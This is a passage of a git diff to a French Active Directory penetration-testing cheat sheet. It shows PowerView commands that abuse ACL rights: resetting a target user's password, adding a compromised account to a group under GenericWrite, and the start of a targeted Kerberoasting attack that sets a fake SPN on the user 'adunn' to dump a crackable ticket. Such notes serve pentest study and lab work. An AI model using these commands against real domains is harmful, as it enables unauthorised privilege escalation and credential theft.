@@ -35,14 +35,23 @@ Set-DomainUserPassword -Identity Target_AD_User -Password $pass
 ```
 
 ### GenericWrite 
+
 Permet :
 - l'ajout d'un utitilisateur comme membre d'un groupe sur le quel on dispose de ce droit
 
 ```powershell
-Add-DomainGroupMember -Identity "Target Group With GenericWrite right" -Members compromised
+Add-DomainGroupMember -Identity "Target Group With GenericWrite right" -Members 'compromised'
 # Verification
-Get-DomainGroupMember -Identity "Help Desk Level 1" | ?{$_.MemberName -eq 'wley'}
+Get-DomainGroupMember -Identity "Target Group With GenericWrite right" | ?{$_.MemberName -eq 'compromised'}
+```
 
+### GenericAll
+
+Permet de récupérer le hash du mot de passe d'un utilisateur sur lequel on dispose de ce privilège.
+L'attaque se nomme "Targetted Kerberoasting".
+Elle conciste en la création d'un SPN sur le compte cible afin de récupérer un TGS à cracker hors ligne.
+Si le mot de passe est facile à deviner, on pourra le casser comme dans une attaque de Kerberoasting classique ()
+```
 #########################################################
 # Create fake SPN for targetted user 'adunn' and dump TGS
 $targetedUser = 'adunn'
